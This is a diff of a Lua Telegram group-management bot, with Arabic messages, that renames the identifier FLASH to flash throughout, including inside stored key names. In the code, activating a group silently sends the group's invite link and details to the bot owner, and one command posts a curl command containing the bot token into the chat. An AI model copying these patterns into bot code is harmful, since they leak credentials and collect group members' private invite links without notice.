-FLASHdx1:set(FLASH..'lock:bot:free'..bot_id,true) 
+flash = '❅∫ تم تعطيل البوت الخدمي ' 
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
+flashdx1:set(flash..'lock:bot:free'..bot_id,true) 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'تفعيل التنبيه' then 
 if not is_sudo(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطورين فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطورين فقط ', 1, 'md')
 else 
-local  FLASH = '❅∫ تم تفعيل التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ في كل مجموعات البوت' 
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
-FLASHdx1:del(FLASH..'lock:bot:ttt'..bot_id) 
+local  flash = '❅∫ تم تفعيل التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ في كل مجموعات البوت' 
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
+flashdx1:del(flash..'lock:bot:ttt'..bot_id) 
 end end
 if text == 'تعطيل التنبيه' then 
 if not is_sudo(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطورين فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطورين فقط ', 1, 'md')
 else 
-FLASH = '❅∫ تم تعطيل التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ في كل مجموعات البوت' 
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
-FLASHdx1:set(FLASH..'lock:bot:ttt'..bot_id,true) 
+flash = '❅∫ تم تعطيل التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ في كل مجموعات البوت' 
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
+flashdx1:set(flash..'lock:bot:ttt'..bot_id,true) 
 end end
-if text and text == "تفعيل تنبيه التغيرات" and FLASH11(msg) then
-if FLASHdx1:get(FLASH..'lock:bot:ttt'..bot_id) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ معطل في كل الجروبات من قبل المطور  ', 1, 'md')
+if text and text == "تفعيل تنبيه التغيرات" and flash11(msg) then
+if flashdx1:get(flash..'lock:bot:ttt'..bot_id) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ معطل في كل الجروبات من قبل المطور  ', 1, 'md')
 return false 
 end
 if not is_owner(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لمدراء المجموعه فما فوق ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لمدراء المجموعه فما فوق ', 1, 'md')
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ في هذه المجموعه  ', 1, 'md')
-FLASHdx1:del(FLASH.."lock:bot:ttt2:"..msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ في هذه المجموعه  ', 1, 'md')
+flashdx1:del(flash.."lock:bot:ttt2:"..msg.chat_id_)
 end end
-if text and text == "تعطيل تنبيه التغيرات" and FLASH11(msg) then 
+if text and text == "تعطيل تنبيه التغيرات" and flash11(msg) then 
 if not is_owner(msg.sender_user_id_, msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ لمدراء المجموعه فما فوق ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ لمدراء المجموعه فما فوق ', 1, 'md')
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ في هذه المجموعه  ', 1, 'md')
-FLASHdx1:set(FLASH.."lock:bot:ttt2:"..msg.chat_id_,"ok")
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل التنبيه على تغيير\n❅∫ { صوره - اسم - معرف } الاعضاء\n❅∫ في هذه المجموعه  ', 1, 'md')
+flashdx1:set(flash.."lock:bot:ttt2:"..msg.chat_id_,"ok")
 end end
---     By Developer FLASH     -- 
-if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then   
-if FLASHdx1:get(FLASH..'lock:get:photo'..msg.chat_id_) then
-FLASH = '*❅∫ تم تفعيل جلب الصوره الشخصيه ،*'  
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
-FLASHdx1:del(FLASH..'lock:get:photo'..msg.chat_id_) 
+--     By Developer flash     -- 
+if text == 'تفعيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then   
+if flashdx1:get(flash..'lock:get:photo'..msg.chat_id_) then
+flash = '*❅∫ تم تفعيل جلب الصوره الشخصيه ،*'  
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
+flashdx1:del(flash..'lock:get:photo'..msg.chat_id_) 
 else
-FLASH = '*❅∫ تم تفعيل جلب الصوره الشخصيه مسبقا ،*'  
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
+flash = '*❅∫ تم تفعيل جلب الصوره الشخصيه مسبقا ،*'  
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
 end end
-if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then   
-if not FLASHdx1:get(FLASH..'lock:get:photo'..msg.chat_id_) then
-FLASH = '*❅∫ تم تعطيل جلب الصوره الشخصيه ،*'  
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
-FLASHdx1:set(FLASH..'lock:get:photo'..msg.chat_id_,true) 
+if text == 'تعطيل جلب الصوره' and is_owner(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then   
+if not flashdx1:get(flash..'lock:get:photo'..msg.chat_id_) then
+flash = '*❅∫ تم تعطيل جلب الصوره الشخصيه ،*'  
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
+flashdx1:set(flash..'lock:get:photo'..msg.chat_id_,true) 
 else
-FLASH = '*❅∫ تم تعطيل جلب الصوره الشخصيه مسبقا ،*'  
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
+flash = '*❅∫ تم تعطيل جلب الصوره الشخصيه مسبقا ،*'  
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
 end end
---     By Developer FLASH     -- 
-if text and text == "تفعيل الرابط" and FLASH11(msg) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الرابط ', 1, 'md')
-FLASHdx1:del(FLASH.."bot:tt:link:"..msg.chat_id_)
+--     By Developer flash     -- 
+if text and text == "تفعيل الرابط" and flash11(msg) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل الرابط ', 1, 'md')
+flashdx1:del(flash.."bot:tt:link:"..msg.chat_id_)
 end
-if text and text == "تعطيل الرابط" and FLASH11(msg) then 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الرابط ', 1, 'md')
-FLASHdx1:set(FLASH.."bot:tt:link:"..msg.chat_id_,"ok")
+if text and text == "تعطيل الرابط" and flash11(msg) then 
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل الرابط ', 1, 'md')
+flashdx1:set(flash.."bot:tt:link:"..msg.chat_id_,"ok")
 end
---     By Developer FLASH     -- 
-if text and text:match('^تفعيل$') and FLASH11(msg) and is_admin(msg.sender_user_id_, msg.chat_id_) then
+--     By Developer flash     -- 
+if text and text:match('^تفعيل$') and flash11(msg) and is_admin(msg.sender_user_id_, msg.chat_id_) then
 function adding(extra,result,success)
 local txt = {string.match(text, "^(تفعيل)$")}
 local function promote_admin(extra, result, success)
 local admins = result.members_
 for i=0 , #admins do
-FLASHdx1:sadd(FLASH..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
+flashdx1:sadd(flash..'bot:momod:'..msg.chat_id_,admins[i].user_id_)
 if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
 owner_id = admins[i].user_id_
-FLASHdx1:sadd(FLASH.."bot:monsh:"..msg.chat_id_,owner_id)
+flashdx1:sadd(flash.."bot:monsh:"..msg.chat_id_,owner_id)
 end end end 
 getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
 if is_admin(msg.sender_user_id_, msg.chat_id_) then
-if FLASHdx1:get(FLASH.."bot:enable:"..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ المجموعه : *'..title_name(msg.chat_id_)..'*\n❅∫ مفعله سابقا بالبوت .', 1, 'md')
+if flashdx1:get(flash.."bot:enable:"..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ المجموعه : *'..title_name(msg.chat_id_)..'*\n❅∫ مفعله سابقا بالبوت .', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي '..renk_FLASH(msg)..'\n❅∫ تم تفعيل المجموعه ورفع المشرفين .', 1, 'md')
-openChat(msg.chat_id_,FLASH)
-FLASHdx1:sadd("FLASH:addg"..bot_id, msg.chat_id_)
-function FLASH(f1,f2)
-function FLASH333(t1,t2)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي '..renk_flash(msg)..'\n❅∫ تم تفعيل المجموعه ورفع المشرفين .', 1, 'md')
+openChat(msg.chat_id_,flash)
+flashdx1:sadd("flash:addg"..bot_id, msg.chat_id_)
+function flash(f1,f2)
+function flash333(t1,t2)
 if t2.invite_link_ == false then 
 local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
 local req = https.request(getlink)
@@ -8674,67 +8674,67 @@ local link = json:decode(req)
 if link.ok == true then 
 t2.invite_link_ = link.result
 end end  
-FLASHdx1:set(FLASH.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
-FLASHdx(tostring((FLASHdx1:get(FLASH.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ تم تفعيل مجموعه جديده  \n❅∫ معرف المطور ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايدي المطور ⌯» `"..msg.sender_user_id_.."`\n❅∫ معلومات المجموعه ،  \n\n❅∫ اسم المجموعه ⌯»  *"..f2.title_.."*\n❅∫ ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n❅∫ رابط المجموعه ، \n❅∫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
+flashdx1:set(flash.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
+flashdx(tostring((flashdx1:get(flash.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ تم تفعيل مجموعه جديده  \n❅∫ معرف المطور ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايدي المطور ⌯» `"..msg.sender_user_id_.."`\n❅∫ معلومات المجموعه ،  \n\n❅∫ اسم المجموعه ⌯»  *"..f2.title_.."*\n❅∫ ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n❅∫ رابط المجموعه ، \n❅∫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(msg.chat_id_).ID
-}, FLASH333, nil)
+}, flash333, nil)
 end
-openChat(msg.chat_id_,FLASH) 
-FLASHdx1:set(FLASH.."bot:enable:"..msg.chat_id_,true)
-FLASHdx1:setex(FLASH.."bot:charge:"..msg.chat_id_,86400,true)
-FLASHdx1:sadd("FLASH:addg"..bot_id, msg.chat_id_)
+openChat(msg.chat_id_,flash) 
+flashdx1:set(flash.."bot:enable:"..msg.chat_id_,true)
+flashdx1:setex(flash.."bot:charge:"..msg.chat_id_,86400,true)
+flashdx1:sadd("flash:addg"..bot_id, msg.chat_id_)
 local send_to_bot_owner = function(extra, result)
 local v = tonumber(bot_owner)             
 end end end end
 getUser(msg.sender_user_id_,adding)
 end
---     By Developer FLASH     -- 
-if text and text:match('^تعطيل$') and is_monsh(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match('^تعطيل$') and is_monsh(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then
 local txt = {string.match(text, "^(تعطيل)$")}
-if not FLASHdx1:get(FLASH.."bot:enable:"..msg.chat_id_) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ المجموعه : *'..title_name(msg.chat_id_)..'*\n❅∫ معطله سابقا بالبوت .', 1, 'md')
+if not flashdx1:get(flash.."bot:enable:"..msg.chat_id_) then
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ المجموعه : *'..title_name(msg.chat_id_)..'*\n❅∫ معطله سابقا بالبوت .', 1, 'md')
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي '..renk_FLASH(msg)..'\n❅∫ تم تعطيل المجموعه .', 1, 'md')
-FLASHdx1:del(FLASH.."bot:charge:"..msg.chat_id_)
-FLASHdx1:del(FLASH.."bot:enable:"..msg.chat_id_)
-FLASHdx1:srem("FLASH:addg"..bot_id, msg.chat_id_)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ اهلا عزيزي '..renk_flash(msg)..'\n❅∫ تم تعطيل المجموعه .', 1, 'md')
+flashdx1:del(flash.."bot:charge:"..msg.chat_id_)
+flashdx1:del(flash.."bot:enable:"..msg.chat_id_)
+flashdx1:srem("flash:addg"..bot_id, msg.chat_id_)
 local v = tonumber(bot_owner)          
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text and text:match('^[Rr]em(-%d+)$') and is_admin(msg.sender_user_id_, msg.chat_id_) then
 local gp = {string.match(text, "^([Rr]em)(-%d+)$")}
-FLASHdx1:del(FLASH.."bot:charge:"..gp[2])
+flashdx1:del(flash.."bot:charge:"..gp[2])
 local v = tonumber(bot_owner)       
 end
---     By Developer FLASH     -- 
-if text and text:match("^تفعيل كل الجروبات$") and FLASH11(msg) then
-local gps = FLASHdx1:smembers(FLASH.."bot:groups") or 0
-local gps2 = FLASHdx1:smembers("FLASH:addg"..bot_id) or 0
+--     By Developer flash     -- 
+if text and text:match("^تفعيل كل الجروبات$") and flash11(msg) then
+local gps = flashdx1:smembers(flash.."bot:groups") or 0
+local gps2 = flashdx1:smembers("flash:addg"..bot_id) or 0
 for i=1,#gps do
-FLASHdx1:sadd("FLASH:addg"..bot_id, gps[i])
-FLASHdx1:set(FLASH.."bot:enable:"..gps[i],true)
-FLASHdx1:set( FLASH.."bot:charge:"..gps[i],true)
+flashdx1:sadd("flash:addg"..bot_id, gps[i])
+flashdx1:set(flash.."bot:enable:"..gps[i],true)
+flashdx1:set( flash.."bot:charge:"..gps[i],true)
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تفعيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
 end
-if text and text:match("^تعطيل كل الجروبات$") and FLASH11(msg) then
-local gps = FLASHdx1:smembers(FLASH.."bot:groups") or 0
-local gps2 = FLASHdx1:smembers("FLASH:addg"..bot_id) or 0
+if text and text:match("^تعطيل كل الجروبات$") and flash11(msg) then
+local gps = flashdx1:smembers(flash.."bot:groups") or 0
+local gps2 = flashdx1:smembers("flash:addg"..bot_id) or 0
 for i=1,#gps do
-FLASHdx1:del("FLASH:addg"..bot_id, gps[i])
-FLASHdx1:del(FLASH.."bot:enable:"..gps[i],true)
-FLASHdx1:del( FLASH.."bot:charge:"..gps[i],true)
+flashdx1:del("flash:addg"..bot_id, gps[i])
+flashdx1:del(flash.."bot:enable:"..gps[i],true)
+flashdx1:del( flash.."bot:charge:"..gps[i],true)
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم تعطيل المجموعات *{'..(#gps - #gps2)..'}*', 1, 'md')
 end   
---     By Developer FLASH     -- 
-if text and text:match("^الدعم$") or text:match("^المطور$") and FLASH11(msg) then
+--     By Developer flash     -- 
+if text and text:match("^الدعم$") or text:match("^المطور$") and flash11(msg) then
 function adding(extra,result,success)
-function FLASH(f1,f2)
-function FLASH333(t1,t2)
+function flash(f1,f2)
+function flash333(t1,t2)
 if t2.invite_link_ == false then 
 local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
 local req = https.request(getlink)
@@ -8742,46 +8742,46 @@ local link = json:decode(req)
 if link.ok == true then 
   t2.invite_link_ = link.result
 end end
-FLASHdx1:set(FLASH.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
-FLASHdx(tostring((FLASHdx1:get(FLASH.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ هناك من بحاجه للمساعده  \n❅∫ معرف الشخص ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايدي الشخص ⌯» `"..msg.sender_user_id_.."`\n❅∫ معلومات المجموعه ،  \n\n❅∫ اسم المجموعه ⌯»  *"..f2.title_.."*\n❅∫ ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n❅∫ رابط المجموعه ، \n❅∫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
+flashdx1:set(flash.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
+flashdx(tostring((flashdx1:get(flash.."bot:leader:gr") or bot_owner)), 0, 1, "❅∫ هناك من بحاجه للمساعده  \n❅∫ معرف الشخص ⌯» @"..(result.username_ or "لا يوجد").."\n❅∫ ايدي الشخص ⌯» `"..msg.sender_user_id_.."`\n❅∫ معلومات المجموعه ،  \n\n❅∫ اسم المجموعه ⌯»  *"..f2.title_.."*\n❅∫ ايدي المجموعه ⌯» `"..msg.chat_id_.."`\n❅∫ رابط المجموعه ، \n❅∫ "..(t2.invite_link_ or "Error").."\n" , 1, 'md')
 end
 tdcli_function ({
 ID = "GetChannelFull",
 channel_id_ = getChatId(msg.chat_id_).ID
-}, FLASH333, nil)
+}, flash333, nil)
 end
-openChat(msg.chat_id_,FLASH) 
+openChat(msg.chat_id_,flash) 
 end
 getUser(msg.sender_user_id_,adding)
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'جلب نسخه الملف' then
 if not is_leader(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطور الاساسي فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطور الاساسي فقط ', 1, 'md')
 else
-if not FLASHdx1:get(FLASH..'lock:add'..msg.chat_id_) then
-sendDocument(bot_owner, 0, 0, 1, nil, './FLASH.lua', dl_cb, nil)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم ارسال نسخه الملف الى خاصك مع البوت ', 1, 'md')
+if not flashdx1:get(flash..'lock:add'..msg.chat_id_) then
+sendDocument(bot_owner, 0, 0, 1, nil, './flash.lua', dl_cb, nil)
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم ارسال نسخه الملف الى خاصك مع البوت ', 1, 'md')
 end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == 'روابط الجروبات' or text == 'روابط المجموعات' then
 if not is_leader(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطور الاساسي فقط ', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ للمطور الاساسي فقط ', 1, 'md')
 else
 local groups = function(extra, result) 
-local num = (FLASHdx1:scard(FLASH.."bot:groups"))
-local list = FLASHdx1:smembers(FLASH.."bot:groups")
-local text = "~ Groups_Bots_In_the_Bot_Of_Source_FLASH ~ @FAQY4\n\n"
+local num = (flashdx1:scard(flash.."bot:groups"))
+local list = flashdx1:smembers(flash.."bot:groups")
+local text = "~ Groups_Bots_In_the_Bot_Of_Source_flash ~ @FAQY4\n\n"
 for k,v in pairs(list) do
-local GroupsMonsh = FLASHdx1:scard(FLASH.."bot:monsh:"..v) or 0
-local GroupsOwner = FLASHdx1:scard(FLASH.."bot:owners:"..v) or 0
-local GroupsMod = FLASHdx1:scard(FLASH.."bot:momod:"..v) or 0
-local Groupslink = FLASHdx1:get(FLASH.."bot:group:link" ..v)
+local GroupsMonsh = flashdx1:scard(flash.."bot:monsh:"..v) or 0
+local GroupsOwner = flashdx1:scard(flash.."bot:owners:"..v) or 0
+local GroupsMod = flashdx1:scard(flash.."bot:momod:"..v) or 0
+local Groupslink = flashdx1:get(flash.."bot:group:link" ..v)
 if result.first_name_ then
 if #result.first_name_ < 35 then
 else
-for FLASH222 in string.gmatch(result.first_name_, "[^%s]+") do
-result.first_name_ = FLASH222
+for flash222 in string.gmatch(result.first_name_, "[^%s]+") do
+result.first_name_ = flash222
 break
 end end end
 text = text..k.."❅∫ Group ID  : [ "..v.." ]\n❅∫ Group Link : [ "..(Groupslink or "Not Found").." ]\n❅∫ Group Monsh : [ "..GroupsMonsh.." ]\n❅∫ Group Owners : [ "..GroupsOwner.." ]\n❅∫ Group Momods : [ "..GroupsMod.." ] \n~~~~~~~~~~~~~~~~~\n"
@@ -8792,29 +8792,29 @@ file:close()
 local dxx = 'https://api.telegram.org/bot' .. tokenbot .. '/sendDocument'
 local dxxx = 'curl "' .. dxx .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'Groups_Bot.txt' .. '"'
 io.popen(dxxx)
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ عزيزي ⌯» *'..result.first_name_..'*\n❅∫ جاري ارسال نسخه للمجموعات \n❅∫ تحتوي على *('..num..')* مجموعه\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ عزيزي ⌯» *'..result.first_name_..'*\n❅∫ جاري ارسال نسخه للمجموعات \n❅∫ تحتوي على *('..num..')* مجموعه\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n', 1, 'md')
 sleep(1.5)
-FLASHdx(msg.chat_id_, msg.id_, 1, dxxx, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, dxxx, 1, 'md')
 end
 getUser(msg.sender_user_id_, groups)
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == "نشر بالخاص" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == " اذاعه خاص " and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
-FLASHdx1:setex(FLASH.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
-local FLASH = '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..'\n❅∫ ارسل لي سواء \n❅∫ ❨ ملصق ، متحركه ، صوره ، رساله ❩ \nللخروج ارسل ،  ( الغاء ) \n '
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
+flashdx1:setex(flash.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
+local flash = '❅∫ اهلا عزيزي ، '..renk_flash(msg)..'\n❅∫ ارسل لي سواء \n❅∫ ❨ ملصق ، متحركه ، صوره ، رساله ❩ \nللخروج ارسل ،  ( الغاء ) \n '
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
 return false
 end 
-if FLASHdx1:get(FLASH.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
+if flashdx1:get(flash.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء امر الاذاعه ،", 1, 'md')
-FLASHdx1:del(FLASH.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء امر الاذاعه ،", 1, 'md')
+flashdx1:del(flash.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end 
-list = FLASHdx1:smembers(FLASH..'bot:userss') 
+list = flashdx1:smembers(flash..'bot:userss') 
 if msg.content_.text_ then
 for k,v in pairs(list) do 
-FLASHdx(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
+flashdx(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
 end
 elseif msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -8833,26 +8833,26 @@ elseif msg.content_.sticker_ then
 for k,v in pairs(list) do 
 sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
 end end
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم اذاعه رسالتك بنجاح \n❅∫ الى ، ❨ "..#list.." ❩ مشترك \n ", 1, 'md')
-FLASHdx1:del(FLASH.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم اذاعه رسالتك بنجاح \n❅∫ الى ، ❨ "..#list.." ❩ مشترك \n ", 1, 'md')
+flashdx1:del(flash.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == "اذاعه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == " اذاعه عام" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
-FLASHdx1:setex(FLASH.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
-local FLASH = '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..'\n❅∫ ارسل لي سواء \n❅∫ ❨ ملصق ، متحركه ، صوره ، رساله ❩ \nللخروج ارسل ،  ( الغاء ) \n '
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
+flashdx1:setex(flash.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
+local flash = '❅∫ اهلا عزيزي ، '..renk_flash(msg)..'\n❅∫ ارسل لي سواء \n❅∫ ❨ ملصق ، متحركه ، صوره ، رساله ❩ \nللخروج ارسل ،  ( الغاء ) \n '
+flashdx( msg.chat_id_, msg.id_, 1, flash, 1, "md") 
 return false
 end 
-if FLASHdx1:get(FLASH.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
+if flashdx1:get(flash.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء امر الاذاعه ،", 1, 'md')
-FLASHdx1:del(FLASH.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم الغاء امر الاذاعه ،", 1, 'md')
+flashdx1:del(flash.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end 
-list = FLASHdx1:smembers(FLASH..'bot:groups') 
+list = flashdx1:smembers(flash..'bot:groups') 
 if msg.content_.text_ then
 for k,v in pairs(list) do 
-FLASHdx(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
+flashdx(v, 0, 1, '['..msg.content_.text_..']', 1, 'md')
 end
 elseif msg.content_.photo_ then
 if msg.content_.photo_.sizes_[0] then
@@ -8871,23 +8871,23 @@ elseif msg.content_.sticker_ then
 for k,v in pairs(list) do 
 sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
 end end
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم اذاعه رسالتك بنجاح \n❅∫ الى ، ❨ "..#list.." ❩ مجموعه \n ", 1, 'md')
-FLASHdx1:del(FLASH.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم اذاعه رسالتك بنجاح \n❅∫ الى ، ❨ "..#list.." ❩ مجموعه \n ", 1, 'md')
+flashdx1:del(flash.."Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
-FLASHdx1:setex(FLASH.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
-local FLASH = '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..'\n❅∫ ارسل الرساله الان لتوجيهها\nللخروج ارسل ،  ( الغاء ) \n '
-FLASHdx( msg.chat_id_, msg.id_, 1, FLASH, 1, "md") 
+flashdx1:setex(flash.."Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
+local flash = '❅∫ اهلا عزيزي ، '..renk_flash(msg)..'\n❅∫ ارسل الرساله الان لتوجيهها\nللخروج ارسل ،  ( الغاء ) \n '
